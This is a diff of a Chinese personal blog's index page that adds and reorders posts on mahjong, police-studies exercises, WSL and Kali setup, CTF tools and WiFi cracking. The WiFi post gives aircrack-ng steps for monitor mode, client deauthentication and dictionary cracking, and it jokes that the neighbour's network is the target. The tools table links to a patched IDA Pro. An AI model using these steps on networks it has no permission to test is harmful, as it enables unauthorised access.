-					<span class="hljs-built_in">FillConsoleOutputCharacter</span>(hOut, <span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-number">1</span>, crPos, &amp;res);
-					<span class="hljs-keyword">break</span>;
-	 
-				<span class="hljs-keyword">default</span>:
-					<span class="hljs-keyword">break</span>;
-			&#125;
-		&#125;		
-	&#125;
-	<span class="hljs-built_in">CloseHandle</span>(hOut);  <span class="hljs-comment">// 关闭标准输出设备句柄  </span>
-	<span class="hljs-built_in">CloseHandle</span>(hIn);   <span class="hljs-comment">// 关闭标准输入设备句柄  </span>
-	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;  
-&#125;</code></pre>
-		
-	</div>
-	
-	<div class="post shadow">
-		<h1 class="postTitle">
-			<a href="/2023/07/06/日本麻将资料整理/">
-				日本麻将资料整理
-			</a>
-		</h1>
-		<div class="postInfo">
-			2023-07-06
-		</div>
-		
-		<p><strong>书名一览（为保证浏览体验，请关闭翻译）</strong></p>
-<blockquote>
-<p>《ASAPIN 天才雀士に麻雀のことを聞いたらバカ勝ちできた》<br>《Guzaku 傑作「何切る」300選》<br>《Guzaku 定石「何切る」301選》<br>《owata 三人麻雀の極意》<br>《ZERO ゼロ秒思考の麻雀》<br>《ZERO 麻雀強者の0秒思考》<br>《かにマジン 日本一麻雀が強いサラリーマンの必勝法》<br>《きよ アマチュア地方最強位が作る新麻雀マニュアル》<br>《みーにん 「統計学」のマージャン戦術》<br>《みーにん 知るだけで強くなる麻雀の2択》<br>《ゆうせー 実戦でよく出る!麻雀講義》<br>《中島準也 理論的思考で勝つ麻雀》<br>《二階堂亜樹 勝てる麻雀の基本》<br>《土井泰昭 勝つ人は知っている現代麻雀30の新常識》<br>《土田浩翔 運を育てる》<br>《堀内正人 麻雀の麒麟児の一打》<br>《堀慎吾 麻雀だから君は負けるんです》<br>《多井隆晴 多井熱》<br>《小林剛 スーパーデジタル麻雀》<br>《川村晃裕 麻雀勝ち組の鳴きテクニック》<br>《平澤元気 よくわかる麻雀の勝ち方》<br>《平澤元気 現代麻雀の秘技相手に対応させる技術》<br>《平澤元気 絶対にラスを引かない麻雀ラス回避35の技術》<br>《日本プロ麻雀連盟 麻雀基本手筋コレクション》<br>《朝倉康心 麻雀の失敗学》<br>《比嘉秀仁 強者の最近手筋100》<br>《水上直紀 麻雀AI戦術》<br>《独歩 序盤の鉄戦略》<br>《独歩 鉄押しの条件》<br>《石橋伸洋 進化するデジタル麻雀》<br>《石橋伸洋 黒いデジタル麻雀》<br>《福地誠 これだけで勝てる!麻雀の基本形80》<br>《福地誠 手作りと押し引きの鉄戦術》<br>《福地誠 麻雀10倍勝てるテクニック》<br>《福地誠 麻雀の正解》<br>《福地誠 麻雀テクニック》<br>《福地誠 麻雀勝ち組の選択》<br>《福地誠 麻雀勝ち組の選択II》<br>《菊池翔 絶対に負けない最強麻雀戦術》<br>《藤田晋 仕事が麻雀で麻雀が仕事》<br>《近代麻雀 プロに挑戦!!麻雀検定》<br>《近代麻雀 麻雀プロMリーグ選手名鑑》<br>《近藤誠一 大きく打ち大きく勝つ麻雀》<br>《鈴木たろう ゼウスの選択》<br>《馬場裕一 バビーのメンチン何切る》<br>《鳳南研究所 現代麻雀の神ワザ》</p>
-</blockquote>
-<h2 id="下载链接"><a href="#下载链接" class="headerlink" title="下载链接"></a>下载链接</h2><p><strong>资料来源于网络</strong></p>
-<p><strong>仅供交流学习使用，不得用于任何商业用途</strong></p>
-<p><a target="_blank" rel="noopener" href="https://cowtransfer.com/s/cc797d6a256440">https://cowtransfer.com/s/cc797d6a256440</a> 点击链接查看 【 PDF.zip 】 ，或访问奶牛快传 cowtransfer.com 输入传输口令 f4jzju 查看；</p>
-
-		
-	</div>
-	
-	<div class="post shadow">
-		<h1 class="postTitle">
 			<a href="/2024/10/31/将DEV-C-编辑器打造成神级IDE及美化/">
 				将DEV-C++编辑器打造成神级IDE及美化
 			</a>
@@ -1848,6 +1961,20 @@ HANDLE hIn = <span class="hljs-built_in">GetStdHandle</span>(STD_INPUT_HANDLE);
 	
 	<div class="post shadow">
 		<h1 class="postTitle">
+			<a href="/2024/12/01/公安学基础理论讲义课后习题答案/">
+				公安学基础理论讲义课后习题答案
+			</a>
+		</h1>
+		<div class="postInfo">
+			2024-12-01
+		</div>
+		
+		<h2 id="第一章——警察与公安"><a href="#第一章——警察与公安" class="headerlink" title="第一章——警察与公安"></a>第一章——警察与公安</h2><h3 id="1-警察的中文词源是什么"><a href="#1-警察的中文词源是什么" class="headerlink" title="1.警察的中文词源是什么"></a>1.警察的中文词源是什么</h3><h2 id="第二章——我国公安机关的建立和发展"><a href="#第二章——我国公安机关的建立和发展" class="headerlink" title="第二章——我国公安机关的建立和发展"></a>第二章——我国公安机关的建立和发展</h2><h2 id="第三章——公安机关的性质和宗旨"><a href="#第三章——公安机关的性质和宗旨" class="headerlink" title="第三章——公安机关的性质和宗旨"></a>第三章——公安机关的性质和宗旨</h2><h3 id="1-公安机关的性质是什么？怎样理解其政治属性和组织属性？"><a href="#1-公安机关的性质是什么？怎样理解其政治属性和组织属性？" class="headerlink" title="1.公安机关的性质是什么？怎样理解其政治属性和组织属性？"></a>1.公安机关的性质是什么？怎样理解其政治属性和组织属性？</h3><h3 id="2-公安机关的政治属性和组织属性的要求是什么？"><a href="#2-公安机关的政治属性和组织属性的要求是什么？" class="headerlink" title="2.公安机关的政治属性和组织属性的要求是什么？"></a>2.公安机关的政治属性和组织属性的要求是什么？</h3><h3 id="3-这样理解公安机关宗旨的内涵？"><a href="#3-这样理解公安机关宗旨的内涵？" class="headerlink" title="3.这样理解公安机关宗旨的内涵？"></a>3.这样理解公安机关宗旨的内涵？</h3><h3 id="4-结合实际，谈谈新时代如何正确认识公安机关的性质。"><a href="#4-结合实际，谈谈新时代如何正确认识公安机关的性质。" class="headerlink" title="4.结合实际，谈谈新时代如何正确认识公安机关的性质。"></a>4.结合实际，谈谈新时代如何正确认识公安机关的性质。</h3><h3 id="5-结合实际，试述公安机关的宗旨"><a href="#5-结合实际，试述公安机关的宗旨" class="headerlink" title="5. 结合实际，试述公安机关的宗旨"></a>5. 结合实际，试述公安机关的宗旨</h3><h2 id="第四章——公安机关的职能和任务"><a href="#第四章——公安机关的职能和任务" class="headerlink" title="第四章——公安机关的职能和任务"></a>第四章——公安机关的职能和任务</h2><h3 id="1-什么是公安机关的职能？"><a href="#1-什么是公安机关的职能？" class="headerlink" title="1.什么是公安机关的职能？"></a>1.什么是公安机关的职能？</h3><h3 id="2-公安机关基本职能的内容是什么？"><a href="#2-公安机关基本职能的内容是什么？" class="headerlink" title="2.公安机关基本职能的内容是什么？"></a>2.公安机关基本职能的内容是什么？</h3><h3 id="3-结合实际，试述公安机关专政职能与民主职能的关系。"><a href="#3-结合实际，试述公安机关专政职能与民主职能的关系。" class="headerlink" title="3.结合实际，试述公安机关专政职能与民主职能的关系。"></a>3.结合实际，试述公安机关专政职能与民主职能的关系。</h3><h3 id="4-试述公安机关正确区分和处理两类不同性质矛盾。"><a href="#4-试述公安机关正确区分和处理两类不同性质矛盾。" class="headerlink" title="4.试述公安机关正确区分和处理两类不同性质矛盾。"></a>4.试述公安机关正确区分和处理两类不同性质矛盾。</h3><h3 id="5-什么是公安机关任务？公安机关的基本任务有哪些？"><a href="#5-什么是公安机关任务？公安机关的基本任务有哪些？" class="headerlink" title="5.什么是公安机关任务？公安机关的基本任务有哪些？"></a>5.什么是公安机关任务？公安机关的基本任务有哪些？</h3><h3 id="6-结合实际论述公安机关必须坚持总体国家安全观思想。"><a href="#6-结合实际论述公安机关必须坚持总体国家安全观思想。" class="headerlink" title="6.结合实际论述公安机关必须坚持总体国家安全观思想。"></a>6.结合实际论述公安机关必须坚持总体国家安全观思想。</h3><h3 id="7-传统国家安全和非传统国家安全有什么不同？"><a href="#7-传统国家安全和非传统国家安全有什么不同？" class="headerlink" title="7.传统国家安全和非传统国家安全有什么不同？"></a>7.传统国家安全和非传统国家安全有什么不同？</h3><h3 id="9-结合实际论述新时代公安机关的任务。"><a href="#9-结合实际论述新时代公安机关的任务。" class="headerlink" title="9.结合实际论述新时代公安机关的任务。"></a>9.结合实际论述新时代公安机关的任务。</h3><h3 id="10-维护国家安全。社会稳定是公安机关的重要任务。"><a href="#10-维护国家安全。社会稳定是公安机关的重要任务。" class="headerlink" title="10.维护国家安全。社会稳定是公安机关的重要任务。"></a>10.维护国家安全。社会稳定是公安机关的重要任务。</h3><h2 id="第五章——公安机关的组织机构与管理体制"><a href="#第五章——公安机关的组织机构与管理体制" class="headerlink" title="第五章——公安机关的组织机构与管理体制"></a>第五章——公安机关的组织机构与管理体制</h2><h3 id="1-简述世界各国警察管理体制的类型。"><a href="#1-简述世界各国警察管理体制的类型。" class="headerlink" title="1.简述世界各国警察管理体制的类型。"></a>1.简述世界各国警察管理体制的类型。</h3><h3 id="2-我国公安机关管理体制的内容是什么？"><a href="#2-我国公安机关管理体制的内容是什么？" class="headerlink" title="2.我国公安机关管理体制的内容是什么？"></a>2.我国公安机关管理体制的内容是什么？</h3><h3 id="3-简述我国公安机关管理体制的发展沿革。"><a href="#3-简述我国公安机关管理体制的发展沿革。" class="headerlink" title="3.简述我国公安机关管理体制的发展沿革。"></a>3.简述我国公安机关管理体制的发展沿革。</h3><h3 id="4-试述我国公安机关现行管理体制的意义。"><a href="#4-试述我国公安机关现行管理体制的意义。" class="headerlink" title="4.试述我国公安机关现行管理体制的意义。"></a>4.试述我国公安机关现行管理体制的意义。</h3><h3 id="5-试述我国现行公安机关管理体制存在的问题。"><a href="#5-试述我国现行公安机关管理体制存在的问题。" class="headerlink" title="5.试述我国现行公安机关管理体制存在的问题。"></a>5.试述我国现行公安机关管理体制存在的问题。</h3><h3 id="6-试述改革和完善我国公安机关管理体制的创新举措。"><a href="#6-试述改革和完善我国公安机关管理体制的创新举措。" class="headerlink" title="6.试述改革和完善我国公安机关管理体制的创新举措。"></a>6.试述改革和完善我国公安机关管理体制的创新举措。</h3><h3 id="7-如何正确处理地方党委政府与公安机关的关系。"><a href="#7-如何正确处理地方党委政府与公安机关的关系。" class="headerlink" title="7.如何正确处理地方党委政府与公安机关的关系。"></a>7.如何正确处理地方党委政府与公安机关的关系。</h3>
+		
+	</div>
+	
+	<div class="post shadow">
+		<h1 class="postTitle">
 			<a href="/2024/06/17/vim快速入门/">
 				vim快速入门
 			</a>
@@ -1887,7 +2014,7 @@ HANDLE hIn = <span class="hljs-built_in">GetStdHandle</span>(STD_INPUT_HANDLE);
 	<div class="post shadow">
 		<h1 class="postTitle">
 			<a href="/2024/02/11/kali完整版安装/">
-				kali完整版安装
+				wsl-kali完整版安装
 			</a>
 		</h1>
 		<div class="postInfo">
@@ -1908,90 +2035,134 @@ deb https://mirrors.aliyun.com/kali kali-rolling main non-free contrib
 	
 	<div class="post shadow">
 		<h1 class="postTitle">
-			<a href="/2024/02/08/日本麻将算符表/">
-				日本麻将算符表
+			<a href="/2024/07/26/kali+无线网卡破解wifi密码/">
+				kali+无线网卡破解wifi密码
 			</a>
 		</h1>
 		<div class="postInfo">
-			2024-02-08
+			2024-07-26
 		</div>
 		
-		<blockquote>
-<p>符&#x3D;20（基底符）+各牌组的符数+和牌方式<br>个位不为0的用进一法进到十位</p>
-</blockquote>
-<h2 id="牌组的符数"><a href="#牌组的符数" class="headerlink" title="牌组的符数"></a>牌组的符数</h2><table>
-<thead>
-<tr>
-<th align="center">刻子</th>
-<th align="center">暗</th>
-<th align="center">幺九</th>
-<th align="center">杠</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">2</td>
-<td align="center">(累乘)*2</td>
-<td align="center">(累乘)*2</td>
-<td align="center">(累乘)*4</td>
-</tr>
-</tbody></table>
+		<h1 id="虚拟机-无线网卡（推荐）"><a href="#虚拟机-无线网卡（推荐）" class="headerlink" title="虚拟机+无线网卡（推荐）"></a>虚拟机+无线网卡（推荐）</h1><h2 id="材料准备"><a href="#材料准备" class="headerlink" title="材料准备"></a>材料准备</h2><ol>
+<li>安装有kali虚拟机的电脑，最好别用wsl（会有一些莫名其妙的错误）</li>
+<li>无线网卡一枚（最好免驱），网购约30元，我使用的是mt7601u</li>
+<li>字典（自己生成或者网上下载如Top100）</li>
+<li><del>邻居家的wifi</del></li>
+</ol>
+<h2 id="将无线网卡连接至虚拟机"><a href="#将无线网卡连接至虚拟机" class="headerlink" title="将无线网卡连接至虚拟机"></a>将无线网卡连接至虚拟机</h2><p>请务必先打开kali虚拟机后，后将无线网卡插上电脑。</p>
+<p>这样在VMwwre中才会出现一个弹窗“检测到新的usb设备”选择“连接到虚拟机”，选中你的虚拟机点确定</p>
+<p>打开终端，输入<code>ifconfig</code>，如果列出的表中有<code>wlan0</code>，则说明无线网卡已经成功连接到kali虚拟机中</p>
+<p><img src="https://s2.loli.net/2024/11/28/TAnbiq8o3svLEOp.png" alt=" 2024-11-28 190541.png"></p>
+<h2 id="开启监听模式"><a href="#开启监听模式" class="headerlink" title="开启监听模式"></a>开启监听模式</h2><p>开启网卡监听（注意下面图片中的monitor mode enable，表示监听模式启动）</p>
+<pre><code class="hljs bash">airmon-ng start wlan0</code></pre>
+
+<p><img src="https://s2.loli.net/2024/11/28/CPBGWlVsOyNZX3c.png" alt=" 2024-11-28 190808.png"></p>
+<p>扫描附近的wifi，搜索到你要破解的wifi的名字时，及时按下<code>空格</code>暂停扫描，以免扫描的东西不见了，也方便复制：</p>
+<pre><code class="hljs bash">airodump-ng wlan0</code></pre>
 <table>
 <thead>
 <tr>
-<th align="center">雀头</th>
-<th align="center">顺子</th>
+<th align="center">BSSID</th>
+<th align="center">CH</th>
+<th align="center">ESSID</th>
 </tr>
 </thead>
 <tbody><tr>
-<td align="center">2*番数</td>
-<td align="center">0</td>
+<td align="center">wifi的网卡</td>
+<td align="center">信道</td>
+<td align="center">wifi的名字</td>
 </tr>
 </tbody></table>
-<h2 id="和牌方式"><a href="#和牌方式" class="headerlink" title="和牌方式"></a>和牌方式</h2><table>
-<thead>
-<tr>
-<th align="center">门清前放铳</th>
-<th align="center">自摸</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">10</td>
-<td align="center">2</td>
-</tr>
-</tbody></table>
+<p><img src="https://s2.loli.net/2024/11/28/R3flWUaoHMkh1uX.png" alt=" 2024-11-28 191752.png"></p>
+<p>这时候最好不要按Ctrl+C退出上一步，最好是再打开一个控制台窗口，查看wifi连接的设备</p>
+<pre><code class="hljs bash">airodump-ng --bssid &lt;BSSID&gt; -c &lt;CH&gt; -w &lt;文件名不用自己加后缀&gt; wlan0</code></pre>
+
+<p>抓包</p>
+<pre><code class="hljs bash">aireplay-ng -0 2 -a &lt;BSSID&gt; -c &lt;STATION&gt; wlan0</code></pre>
+<p>参数说明：-0抓取包的个数，-a路由器MAC，-c用户MAC</p>
+<p>破解wifi密码，跑包，如果密码字典中有密码，即可破解成功</p>
+<pre><code class="hljs bash">aircrack-ng -w &lt;字典路径&gt; &lt;文件名不用自己加后缀&gt;</code></pre>
+
+<p>停止监听</p>
+<pre><code class="hljs bash">airmon stop wlan0</code></pre>
+
+<h1 id="WSL-无线网卡（无效）"><a href="#WSL-无线网卡（无效）" class="headerlink" title="WSL+无线网卡（无效）"></a>WSL+无线网卡（无效）</h1><h2 id="使用USBIPD将无线网卡绑定到WSL"><a href="#使用USBIPD将无线网卡绑定到WSL" class="headerlink" title="使用USBIPD将无线网卡绑定到WSL"></a>使用USBIPD将无线网卡绑定到WSL</h2><p>参考文档：<a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/windows/wsl/connect-usb">Microsoft-连接USB设备</a></p>
+<p>你有两种方式安装usbipd</p>
+<p>第一种，在GitHub发布页中下载<a target="_blank" rel="noopener" href="https://github.com/dorssel/usbipd-win/releases">https://github.com/dorssel/usbipd-win/releases</a>，下载usbipd-win_x.x.x.msi，然后安装即可</p>
+<p>第二种，如果你的Windows有安装winget，那么可以通过输入命令来安装</p>
+<pre><code class="hljs shell">winget install --interactive --exact dorssel.usbipd-win</code></pre>
+
+<p>安装好usbipd后，打开powershell（以管理员模式打开），先别着急打开wsl</p>
+<p>确保你的无线网卡插入了电脑后，输入查看</p>
+<pre><code class="hljs shell">usbipd list</code></pre>
+
+<p><img src="https://s2.loli.net/2024/11/28/spBltRFcGbKHQiN.png" alt=" 2024-11-28 140241.png"></p>
+<p>我们可以看到，我的无线网卡名称为<strong>802.11n USB Wireless LAN Card</strong>，它的<strong>BUSID</strong>为<strong>2-1</strong></p>
+<p>接下来输入命令使无线网卡处于共享状态</p>
+<pre><code class="hljs shell">usbipd bind --busid &lt;busid&gt;</code></pre>
+
+
+
+<p><img src="https://s2.loli.net/2024/11/28/ae4GZQ273wJsPbo.png" alt=" 2024-11-28 140719.png"></p>
+<p>通过后面的命令我们可以看到，我的无线网卡已经处于<strong>Shared</strong>的状态，那我们就可以将其绑定到WSL中（在此之前需要先打开WSL，否则可能会报错)：</p>
+<pre><code class="hljs shell">usbipd attach --wsl --busid &lt;busid&gt;</code></pre>
+
+<p><img src="https://s2.loli.net/2024/11/28/jdSRNucyM35Aktg.png" alt=" 2024-11-28 141405.png"></p>
+<p>这里附一条解除绑定的命令（别乱输啊），不过官方文档是说也可以通过物理移除的方式（通俗的讲就是直接拔）：</p>
+<pre><code class="hljs shell">usbipd detach --busid &lt;busid&gt;</code></pre>
+
+
+
+<p>到此，你的Windows可能会弹出一条移除设备的信息，并且在Windows下的WLAN也看不到了两张网卡，这是正常现象，它说明你已经成功的将无线网卡添加到了WSL中。</p>
+<p>我们不妨进一步进行验证 。切换到WSL的窗口，输入<code>lsusb</code>可以查看接入的USB：</p>
+<p><img src="https://s2.loli.net/2024/11/28/2hnLKbeyFcWqkQP.png" alt=" 2024-11-28 141854.png"></p>
+<p>其中的<strong>Ralink Technology, Corp. MT7601U Wireless Adapter</strong>就是我的网卡，显然，USB添加成功了。</p>
+<p>但是，输入<code>ifconfig</code>查看，好家伙没有无线网。。。（好吧，我承认到此我不会了</p>
+<h1 id="Windows-无线网卡"><a href="#Windows-无线网卡" class="headerlink" title="Windows+无线网卡"></a>Windows+无线网卡</h1><p>去<a target="_blank" rel="noopener" href="https://www.aircrack-ng.org/">Aircrack-ng官网</a>下载工具，Windows版本包含以下工具</p>
 <table>
 <thead>
 <tr>
-<th align="center">平和自摸</th>
-<th align="center">平和放铳</th>
-<th align="center">特殊牌型</th>
+<th>命令（有用的）</th>
+<th>功能</th>
 </tr>
 </thead>
 <tbody><tr>
-<td align="center">20（固定）</td>
-<td align="center">30（固定）</td>
-<td align="center">25（固定）</td>
+<td>airbase-ng</td>
+<td></td>
 </tr>
-</tbody></table>
-<table>
-<thead>
 <tr>
-<th align="center">边张（单骑）</th>
-<th align="center">嵌张（单骑）</th>
-<th align="center">雀头（单骑）</th>
-<th align="center">双碰（非单骑）</th>
-<th align="center">两面（非单骑）</th>
+<td>aircrack-ng</td>
+<td>最后破解：破解WEP以及WPA（字典攻击）密钥</td>
 </tr>
-</thead>
-<tbody><tr>
-<td align="center">2</td>
-<td align="center">2</td>
-<td align="center">2</td>
-<td align="center">0</td>
-<td align="center">0</td>
+<tr>
+<td>airdecap-ng</td>
+<td></td>
+</tr>
+<tr>
+<td>airdecloak-ng</td>
+<td></td>
+</tr>
+<tr>
+<td>aireplay-ng</td>
+<td></td>
+</tr>
+<tr>
+<td>airodump-ng</td>
+<td>数据包嗅探：将无线网络数据输送到PCAP或IVS文件并显示网络信息</td>
+</tr>
+<tr>
+<td>airserv-ng</td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
 </tr>
 </tbody></table>
-<h2 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h2><p><a target="_blank" rel="noopener" href="https://lietxia.github.io/fupractice.html">https://lietxia.github.io/fupractice.html</a></p>
 
 		
 	</div>
@@ -2146,79 +2317,6 @@ ssh-keygen -t rsa -b 4096</code></pre>
 	
 	<div class="post shadow">
 		<h1 class="postTitle">
-			<a href="/2024/07/26/kali+无线网卡破解wifi密码/">
-				kali+无线网卡破解wifi密码
-			</a>
-		</h1>
-		<div class="postInfo">
-			2024-07-26
-		</div>
-		
-		<h1 id="材料准备"><a href="#材料准备" class="headerlink" title="材料准备"></a>材料准备</h1><ol>
-<li>安装有kali虚拟机的电脑，最好别用wsl（会有一些莫名其妙的错误）</li>
-<li>无线网卡一枚（最好免驱），网购约30元，我使用的是mt7601u</li>
-<li>字典（自己生成或者网上下载如Top100）</li>
-<li><del>邻居家的wifi</del></li>
-</ol>
-<h1 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h1><h2 id="将无线网卡连接至虚拟机"><a href="#将无线网卡连接至虚拟机" class="headerlink" title="将无线网卡连接至虚拟机"></a>将无线网卡连接至虚拟机</h2><p>请务必先打开kali虚拟机后，后将无线网卡插上电脑。</p>
-<p>这样在VMwwre中才会出现一个弹窗“检测到新的usb设备”选择“连接到虚拟机”，选中你的虚拟机点确定</p>
-<p>打开终端，输入<code>ifconfig</code>，如果列出的表中有<code>wlan0</code>，则说明无线网卡已经成功连接到kali虚拟机中</p>
-<h2 id="开启监听模式"><a href="#开启监听模式" class="headerlink" title="开启监听模式"></a>开启监听模式</h2><p>首先获取root权限</p>
-<pre><code class="hljs bash">sudo su</code></pre>
-
-<p>开启网卡监听</p>
-<pre><code class="hljs bash">airmon-ng start wlan0</code></pre>
-
-<p>查看是否监听成功</p>
-<pre><code class="hljs bash">ifconfig</code></pre>
-
-<p>扫描附近的wifi，搜索到你要破解的wifi时及时按下<code>空格</code>暂停扫描，以免扫描的东西不见了</p>
-<pre><code class="hljs bash">airodump-ng wlan0</code></pre>
-<table>
-<thead>
-<tr>
-<th align="center">BSSID</th>
-<th align="center">CH</th>
-<th align="center">ESSID</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">wifi的网卡</td>
-<td align="center">信道</td>
-<td align="center">wifi的名字</td>
-</tr>
-</tbody></table>
-<p>查看wifi连接的设备</p>
-<pre><code class="hljs bash">airodump-ng --bssid &lt;BSSID&gt; -c &lt;CH&gt; -w &lt;文件名不用自己加后缀&gt; wlan0</code></pre>
-
-<p>抓包</p>
-<pre><code class="hljs bash">aireplay-ng -0 2 -a &lt;BSSID&gt; -c &lt;STATION&gt; wlan0</code></pre>
-<p>参数说明：-0抓取包的个数，-a路由器MAC，-c用户MAC</p>
-<p>破解wifi密码，跑包，如果密码字典中有密码，即可破解成功</p>
-<pre><code class="hljs bash">aircrack-ng -w &lt;字典路径&gt; &lt;文件名不用自己加后缀&gt;</code></pre>
-
-<p>停止监听</p>
-<pre><code class="hljs bash">airmon stop wlan0</code></pre>
-
-		
-	</div>
-	
-	<div class="post shadow">
-		<h1 class="postTitle">
-			<a href="/2024/10/31/Wolfram-Language学习/">
-				Wolfram Language学习
-			</a>
-		</h1>
-		<div class="postInfo">
-			2024-10-31
-		</div>
-		
-		
-		
-	</div>
-	
-	<div class="post shadow">
-		<h1 class="postTitle">
 			<a href="/2024/08/19/CTF常用工具下载/">
 				CTF常用工具下载
 			</a>
@@ -2257,7 +2355,7 @@ ssh-keygen -t rsa -b 4096</code></pre>
 <tr>
 <td align="center"><font color="#bf3553">IDA</font></td>
 <td align="center">Pro:<a target="_blank" rel="noopener" href="https://hex-rays.com/">付费</a></td>
-<td align="center"><a target="_blank" rel="noopener" href="https://www.123pan.com/s/fyzA-hNsod.html">v8.3汉化版</a></td>
+<td align="center"><a target="_blank" rel="noopener" href="https://www.123pan.com/s/fyzA-hNsod.html">v8.3汉化版</a><br><a target="_blank" rel="noopener" href="https://www.52pojie.cn/forum.php?mod=viewthread&tid=1970020&highlight=ida+pro">v9.0补丁正版（推荐）</a></td>
 <td align="center">专业级逆向工具</td>
 </tr>
 <tr>
@@ -2315,34 +2413,6 @@ ssh-keygen -t rsa -b 4096</code></pre>
 	
 	<div class="post shadow">
 		<h1 class="postTitle">
-			<a href="/2024/10/28/CTF-Pwn/">
-				CTF-Pwn
-			</a>
-		</h1>
-		<div class="postInfo">
-			2024-10-28
-		</div>
-		
-		
-		
-	</div>
-	
-	<div class="post shadow">
-		<h1 class="postTitle">
-			<a href="/2024/10/28/CTF-Reverse/">
-				CTF-Reverse
-			</a>
-		</h1>
-		<div class="postInfo">
-			2024-10-28
-		</div>
-		
-		
-		
-	</div>
-	
-	<div class="post shadow">
-		<h1 class="postTitle">
 			<a href="/2024/10/28/CTF-Web/">
 				CTF-Web
 			</a>
@@ -2391,7 +2461,7 @@ ssh-keygen -t rsa -b 4096</code></pre>
 </tr>
 <tr>
 <td align="center">X-Forwarded-For</td>
-<td align="center">可填入127.0.0.1</td>
+<td align="center">我也不太懂，但是好像可以填入127.0.0.1来表示本地？</td>
 </tr>
 <tr>
 <td align="center">Connection</td>
@@ -2444,6 +2514,34 @@ group_concat(列名称) <span class="hljs-comment">--将一列的东西单项显
 
 <p>MD5值相同的字符串：s878926199a 和 s155964671a</p>
 
+		
+	</div>
+	
+	<div class="post shadow">
+		<h1 class="postTitle">
+			<a href="/2024/10/28/CTF-Reverse/">
+				CTF-Reverse
+			</a>
+		</h1>
+		<div class="postInfo">
+			2024-10-28
+		</div>
+		
+		
+		
+	</div>
+	
+	<div class="post shadow">
+		<h1 class="postTitle">
+			<a href="/2024/10/28/CTF-Pwn/">
+				CTF-Pwn
+			</a>
+		</h1>
+		<div class="postInfo">
+			2024-10-28
+		</div>
+		
+		
 		
 	</div>
 	
